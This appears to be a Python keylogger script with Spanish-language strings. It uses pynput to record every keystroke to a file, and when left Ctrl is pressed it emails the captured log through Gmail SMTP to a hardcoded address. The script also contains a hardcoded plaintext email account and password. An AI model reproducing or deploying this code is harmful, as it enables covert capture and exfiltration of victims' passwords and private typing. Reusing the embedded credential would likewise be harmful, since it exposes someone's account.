import datetime
from pynput.keyboard import Listener as ls
d=datetime.datetime.now().strftime('%Y-%M-%D_%H-%M-%S')
f=open("register.txt".format(d),'wt',encoding="utf-8")
def SendEmail(user,pwd,recipent,subject,body):
    import smtplib
    gmail_user=user
    gmail_pass=pwd
    FROM=user
    TO=recipent if type(recipent) is list else[recipent]
    SUBJECT=subject
    TEXT=body
    message="""\From: %s\nTo: %s\nSubject: %s\n\n%s
    """%(FROM,",".join(TO),SUBJECT,TEXT)
    try:
        server=smtplib.SMTP("smtp.gmail.com",587)
        server.ehlo()
        server.starttls()
        server.login(gmail_user,gmail_pass)
        server.sendmail(FROM,TO,message)
        server.close()
    except:
        print("Error")
def FormatAndlogEmail():
    with open("register.txt","r+") as f:
        data=f.read().replace('\n','')
        data="log capturado a las "+str(d)+"\n"+data
        SendEmail('josesitoantonito123@gmail.com',"19847173Alvaro","josesitoantonito123@gmail.com","nuevo-log -"+str(d),data)
        f.seek(0)
        f.truncate()
def key_recorder(key):
    key=str(key)
    if key=="Key.enter":
        f.write("\n")
    elif key=="Key.space":
        f.write(" ")
    elif key=="Key.backspace":
        f.write("%BORRAR%")
    elif key == "Key.ctrl_l":
        f.close()
        FormatAndlogEmail()
        quit()
    else:
        f.write(key.replace("'",""))
    print(key,end="")
with ls(on_press=key_recorder) as l:
    l.join()